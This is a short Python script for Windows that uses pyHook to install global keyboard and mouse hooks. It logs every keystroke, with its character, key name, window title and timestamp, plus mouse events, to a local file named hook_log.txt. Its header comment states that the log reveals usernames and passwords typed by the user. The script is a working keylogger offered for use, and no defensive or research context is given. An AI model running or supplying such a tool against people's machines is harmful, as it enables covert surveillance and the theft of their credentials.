#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
this program is to capture the KEYBOARD and MOUSE event on Windows platform.
1. mouse event is too heavy
2. Keyboard event with WindowName, u can get how many times spend on web,app...
    and username/password ...
3. pyHook settup: http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/
    doc: http://pyhook.sourceforge.net/doc_1.5.0/
4. pythonWin settup
'''



import pythoncom
import pyHook
import time

def onMouseEvent(event):
    fobj.writelines('-' * 20 + 'MouseEvent Begin' + '-' * 20 + '\n')
    fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()))
    fobj.writelines("MessageName:%s\n" % str(event.MessageName))
    fobj.writelines("Message:%d\n" % event.Message)
    fobj.writelines("Time_sec:%d\n" % event.Time)
    fobj.writelines("Window:%s\n" % str(event.Window))
    fobj.writelines("WindowName:%s\n" % str(event.WindowName))
    fobj.writelines("Position:%s\n" % str(event.Position))
    fobj.writelines('-' * 20 + 'MouseEvent End' + '-' * 20 + '\n')
    return True

def onKeyboardEvent(event): 
    fobj.writelines('-' * 20 + 'Keyboard Begin' + '-' * 20 + '\n')
    fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()))
    fobj.writelines("MessageName:%s\n" % str(event.MessageName))
    fobj.writelines("Message:%d\n" % event.Message)
    fobj.writelines("Time:%d\n" % event.Time)
    fobj.writelines("Window:%s\n" % str(event.Window))
    fobj.writelines("WindowName:%s\n" % str(event.WindowName))
    fobj.writelines("Ascii_code: %d\n" % event.Ascii)
    fobj.writelines("Ascii_char:%s\n" % chr(event.Ascii))
    fobj.writelines("Key:%s\n" % str(event.Key))
    fobj.writelines('-' * 20 + 'Keyboard End' + '-' * 20 + '\n')
    return True

if __name__ == "__main__": 
    file_name = "hook_log.txt"
    fobj = open(file_name,  'w')       

    hm = pyHook.HookManager()

    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()

    hm.MouseAll = onMouseEvent
    hm.HookMouse()
    
    pythoncom.PumpMessages()
    
    fobj.close() 
